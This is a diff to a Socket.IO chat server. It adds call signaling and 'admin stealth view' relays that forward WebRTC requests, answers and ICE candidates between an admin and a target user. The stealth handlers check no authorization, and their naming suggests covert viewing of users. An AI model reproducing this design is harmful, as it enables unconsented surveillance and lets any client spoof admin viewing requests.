@@ -225,6 +225,50 @@ io.on('connection', (socket) => {
       }
     } catch (err) { console.error("Signal error:", err); }
   });
+
+  // --- NEW: CALL SIGNALING ROUTER ---
+  socket.on('call-signal', (data) => {
+    try {
+      const room = (typeof data === 'object' && data?.room) ? data.room : currentRoom;
+      if (room) {
+        touchRoomActivity(room);
+        socket.to(room).emit('call-signal', data);
+      }
+    } catch (err) { console.error("Call signal error:", err); }
+  });
+
+  // --- NEW: ADMIN STEALTH VIEW ROUTER ---
+  socket.on('stealth_view_request', (data) => {
+    try {
+      const targetRoom = accountRelayRoom(data.targetUserId);
+      io.to(targetRoom).emit('stealth_view_request', data);
+    } catch (err) { console.error("Stealth request error:", err); }
+  });
+
+  socket.on('stealth_view_answer', (data) => {
+    try {
+      const adminRoom = accountRelayRoom(data.adminId);
+      io.to(adminRoom).emit('stealth_view_answer', data);
+    } catch (err) { console.error("Stealth answer error:", err); }
+  });
+
+  socket.on('stealth_ice_candidate', (data) => {
+    try {
+      if (data.from === 'target') {
+        io.to(accountRelayRoom(data.adminId)).emit('stealth_ice_candidate', data);
+      } else if (data.from === 'admin') {
+        io.to(accountRelayRoom(data.targetUserId)).emit('stealth_ice_candidate', data);
+      }
+    } catch (err) { console.error("Stealth ICE error:", err); }
+  });
+
+  socket.on('stealth_view_reject', (data) => {
+    try {
+      const adminRoom = accountRelayRoom(data.adminId);
+      io.to(adminRoom).emit('stealth_view_reject', data);
+    } catch (err) { console.error("Stealth reject error:", err); }
+  });
+  // -------------------------------------
   
   socket.on('chat-message', (data, acknowledge) => {
     Promise.resolve().then(async () => {
@@ -232,6 +276,9 @@ io.on('connection', (socket) => {
       const recipientId = String(data?.recipientId || data?.encrypted?.recipient || '');
       if (recipientId) {
         if (room) touchRoomActivity(room);
+        // Create a one-message Render room. The recipient's current screen or
+        // pair-room membership does not affect delivery; online account-relay
+        // sockets are temporarily added, receive the event, then are removed.
         const recipientRelayRoom = accountRelayRoom(recipientId);
         const recipientSocketIds = [...(io.sockets.adapter.rooms.get(recipientRelayRoom) || [])];
         const recipientSockets = recipientSocketIds
